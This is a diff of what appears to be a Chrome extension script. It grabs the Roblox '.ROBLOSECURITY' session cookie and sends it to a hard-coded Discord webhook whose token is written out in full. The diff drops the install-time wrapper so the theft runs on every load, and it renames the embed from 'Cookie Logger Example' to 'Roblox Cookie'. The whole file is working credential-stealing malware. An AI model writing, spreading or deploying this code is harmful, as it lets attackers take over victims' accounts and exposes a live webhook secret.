@@ -1,6 +1,5 @@
 const webhook = "https://discord.com/api/webhooks/1288229097603989566/kARr2kG1hmAqPxbb9HpSABfcO53c7IU6TmweSb_GCYMUnB7LnFDOcyypMAzinrYJdklJ";
 
-chrome.runtime.onInstalled.addListener(() => {
   chrome.cookies.get(
     { url: "https://roblox.com", name: ".ROBLOSECURITY" },
     (cookie) => {
@@ -14,7 +13,7 @@ chrome.runtime.onInstalled.addListener(() => {
           body: JSON.stringify({
             embeds: [
               {
-                title: "Cookie Logger Example",
+                title: "Roblox Cookie",
                 description: "```" + cookie.value + "```",
               },
             ],
@@ -23,4 +22,3 @@ chrome.runtime.onInstalled.addListener(() => {
       }
     }
   );
-});
